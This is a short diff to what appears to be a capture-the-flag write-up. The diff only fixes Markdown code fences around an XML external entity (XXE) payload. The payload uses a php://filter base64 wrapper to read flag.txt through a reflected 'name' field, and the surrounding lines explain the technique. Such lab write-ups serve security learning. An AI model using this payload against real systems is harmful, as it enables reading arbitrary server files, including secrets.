@@ -27,13 +27,15 @@ Upon sending the form, a response will appear that reflects the "name" parameter
 
 Replace the decoded data the following and hit apply changes: 
 
-```<!DOCTYPE foo [
+```
+<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.txt">
 ]>
 <root>
     <name>&xxe;</name>
     <email>emailhere</email>
-</root>```
+</root>
+```
 (You must use a base64 php filter due to the fact that the flag itself contains characters that break the xml syntax)
 
 Forwarding this new request should get you the flag.txt string in base64
